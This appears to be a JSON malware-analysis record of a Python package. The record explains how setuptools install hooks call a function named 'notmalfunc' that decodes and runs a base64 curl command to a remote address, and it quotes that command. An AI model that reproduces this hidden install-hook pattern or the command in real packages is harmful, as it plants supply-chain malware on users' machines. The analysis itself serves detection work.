{
  "purpose": "The code is designed to set up a Python package with malicious behavior embedded in the installation process, specifically executing a decoded base64 command that performs a network request.",
  "sources": "The base64-encoded string in the 'notmalfunc' function, which is decoded and executed during installation or development setup.",
  "sinks": "The os.system call executing decoded code, which performs an HTTP request to a remote server.",
  "flows": "The setup process triggers 'AfterInstall.run()', which calls 'notmalfunc()', decoding and executing the base64 string that runs a curl command to a remote URL.",
  "anomalies": "Use of base64 encoding to obscure command execution, execution of a network request during package installation, and embedding potentially malicious code within setup scripts.",
  "analysis": "The code imports setup tools and defines a function 'b64d' to decode base64-encoded strings. The function 'notmalfunc' decodes a base64 string which, when decoded, executes 'curl -s http://192.168.1.3:8000/test.txt | base'. This indicates an attempt to contact a remote server during installation. The classes 'AfterDevelop' and 'AfterInstall' extend setuptools commands and invoke 'notmalfunc()' during 'install', meaning any installation will trigger this network request. The use of base64 encoding to conceal the command, coupled with execution during setup, indicates malicious intent aimed at exfiltrating information or connecting to a malicious server.",
  "conclusion": "The package contains embedded malicious code that executes a network request during installation, likely to contact a remote server. The use of base64 encoding to hide this behavior and executing system commands during setup points to intentional malicious activity designed for data exfiltration or other harmful actions.",
